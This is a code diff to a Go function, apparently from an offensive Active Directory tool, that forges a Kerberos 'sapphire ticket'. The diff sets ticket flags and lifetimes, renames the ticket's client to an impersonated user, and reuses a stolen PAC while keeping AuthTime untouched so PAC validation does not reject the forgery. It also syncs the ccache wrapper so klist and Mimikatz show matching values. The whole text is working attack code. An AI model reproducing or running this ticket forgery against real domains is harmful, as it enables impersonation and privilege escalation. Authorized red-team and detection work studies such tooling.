@@ -260,9 +260,10 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 						StartTime: time.Now().UTC(),
 						EndTime:   time.Now().UTC().Add(10 * time.Hour),
 						RenewTill: time.Now().UTC().Add(7 * 24 * time.Hour),
-						// Flags: forwardable, renewable, pre-authent
+						// Flags: forwardable + proxiable + renewable + initial + pre-authent + enc-pa-rep.
+						// Must match what we set on the EncTicketPart (see replacePAC block below).
 						Flags: asn1.BitString{
-							Bytes:     []byte{0x40, 0xe1, 0x00, 0x00}, // 0x40e10000
+							Bytes:     []byte{0x50, 0xe1, 0x00, 0x00}, // 0x50e10000
 							BitLength: 32,
 						},
 					},
@@ -488,6 +489,30 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 			NameString: []string{req.Impersonate},
 		}
 		fmt.Printf("[*] Changed EncTicketPart cname to: %s\n", req.Impersonate)
+
+		// Align flags and lifetime with the CredInfo wrapper. Do NOT touch
+		// AuthTime/StartTime here: MS-KILE requires EncTicketPart.AuthTime
+		// to equal PAC_CLIENT_INFO.LogonTime. The stolen PAC's LogonTime was
+		// stamped by the KDC during S4U2Self, so changing AuthTime breaks
+		// PAC validation (KRB_AP_ERR_MODIFIED). Only EndTime, RenewTill,
+		// and Flags are safe to override — none of them are bound to PAC data.
+		modifiedEncPart.Flags = asn1.BitString{
+			Bytes:     []byte{0x50, 0xe1, 0x00, 0x00}, // fwd+proxy+renew+init+preauth+enc-pa-rep
+			BitLength: 32,
+		}
+		modifiedEncPart.EndTime = modifiedEncPart.AuthTime.Add(10 * time.Hour)
+		modifiedEncPart.RenewTill = modifiedEncPart.AuthTime.Add(7 * 24 * time.Hour)
+
+		// Mirror the EncTicketPart fields into the outer CredInfo/ccache wrapper
+		// so klist, describe, and Mimikatz see the same values the KDC does.
+		if tgt.CredInfo != nil && len(tgt.CredInfo.TicketInfo) > 0 {
+			ti := &tgt.CredInfo.TicketInfo[0]
+			ti.Flags = modifiedEncPart.Flags
+			ti.AuthTime = modifiedEncPart.AuthTime
+			ti.StartTime = modifiedEncPart.StartTime
+			ti.EndTime = modifiedEncPart.EndTime
+			ti.RenewTill = modifiedEncPart.RenewTill
+		}
 
 		// EncTicketPart ::= [APPLICATION 3] SEQUENCE { ... }
 		// Go's asn1.Marshal produces a SEQUENCE for struct types
